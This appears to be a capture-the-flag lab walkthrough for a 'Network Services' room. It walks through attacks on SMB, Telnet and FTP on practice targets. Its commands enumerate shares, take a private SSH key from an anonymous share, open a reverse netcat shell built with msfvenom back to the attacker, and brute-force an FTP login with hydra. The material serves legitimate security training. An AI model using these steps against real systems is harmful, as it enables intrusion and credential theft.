# Network Services

- Ready? Let's get going!

	  no answer needed

- What does SMB stand for?

	- `Server Message Block`

- What type of protocol is SMB?

	- `response-request`

- What do clients connect to servers using?

	- `TCP/IP`

- What systems does Samba run on?

	- `Unix`

- Conduct an nmap scan of your choosing, How many ports are open?

	- `nmap -p- -A <TARGET_IP>`
	- `*`

- What ports is SMB running on?

	- `139/445`

- Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?

	- `enum4linux -A <TARGET_IP>`
	- `**********`

- What comes up as the name of the machine?

	- `polosmb`

- What operating system version is running?

	- `6.1`

- What share sticks out as something we might want to investigate?

	- `profiles`

- What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

	- `smbclient //10.10.10.2/secret -U suit -p 139`

- Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.

	  no answer needed

- Does the share allow anonymous access? Y/N?

	- `Y`

- Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

	- `get "Working From Home Information.txt"`
	- Outside smb `cat "Working From Home Information.txt"`
	- `John ******`

- What service has been configured to allow him to work from home?

	- `ssh`

- Okay! Now we know this, what directory on the share should we look in?

	- `.ssh`

- This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

	- `cd .ssh`
	- `ls`

- What is the smb.txt flag?

	- `get id_rsa`
	- `chmod 600 id_rsa`
	- `ssh cactus@<TARGET_IP> -i id_rsa`
	- `cat smb.txt`
	- `***************`

- What is Telnet?

	- `application protocol`

- What has slowly replaced Telnet?

	- `ssh`

- How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

	- `telnet 10.10.10.3 23`

- The lack of what, means that all Telnet communication is in plaintext?

	- `encryption`

- How many ports are open on the target machine?

	- `nmap -p- -A <TARGET_IP>`
	- or `scilla port -target <TARGET_IP>`
	- `1`

- What port is this?

	- `****`

- This port is unassigned, but still lists the protocol it's using, what protocol is this? 

	- `tcp`

- Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

	- `0`

- Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.

	  no answer needed

- Based on the title returned to us, what do we think this port could be used for?

	- `a backdoor`

- Who could it belong to? Gathering possible usernames is an important step in enumeration.

	- `skidy`

- Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.

	  no answer needed

- Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.

	  no answer needed

- Great! It's an open telnet connection! What welcome message do we receive?

	- `SKIDY'S BACKDOOR.`

- Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

	- `N`

- Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.

	  no answer needed

- This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

	  no answer needed

- Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

	- `Y`

- Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!

	  no answer needed

- What word does the generated payload start with?

	- `msfvenom -p cmd/unix/reverse_netcat lhost=<local_tun0_ip> lport=4444 R`
	- `mkfifo`

- What would the command look like for the listening port we selected in our payload?

	- `nc -lvp 4444`

- Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

	  no answer needed

- Success! What is the contents of flag.txt?

	- `THM{**********************}`

- What communications model does FTP use?

	- `client-server`

- What's the standard FTP port?

	- `21`

- How many modes of FTP connection are there?

	- `2`

- How many ports are open on the target machine?

	- `scilla port -target <TARGET_IP>`
	- `*`

- What port is ftp running on?

	- `21`

- What variant of FTP is running on it?

	- `nmap -p- -A <TARGET_IP>`
	- `vsFTPd`

- What is the name of the file in the anonymous FTP directory?

	- `ftp <TARGET_IP>`, `anonymous` and no pwd.
	- `ls`
	- `**************.txt`

- What do we think a possible username
could be?

	- `get *************.txt`
	- Then on your machine `cat *************.txt`
	- `Mike`

- Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...

	  no answer needed

- What is the password for the user "mike"?

	- `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ftp`
	- `********`

- Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted

	  no answer needed

- What is ftp.txt?

	- `ftp <TARGET_IP>`, `mike` and password.
	- `ls`
	- `get ftp.txt`
	- `exit`
	- `cat ftp.txt`
	- `THM{*********************}`

- Well done, you did it!

	  no answer needed





